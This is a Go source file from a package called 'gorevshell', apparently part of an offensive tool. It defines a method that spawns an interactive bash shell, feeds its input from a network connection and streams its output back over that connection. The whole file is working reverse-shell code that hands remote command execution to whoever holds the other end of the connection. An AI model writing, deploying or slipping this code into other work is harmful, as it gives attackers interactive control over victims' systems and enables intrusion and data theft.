package gorevshell

import (
	"io"
	"os/exec"
)

func (r *GoRevShell) Rshell() {

	rp, wp := io.Pipe()
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = r.con
	cmd.Stdout = wp

	// copy result to conn
	go func() {
		_, err := io.Copy(r.con, rp)
		termErr("[-] Error Copying: ", err)
	}()

	cmd.Run() // run cmd Command
	r.con.Close()
}
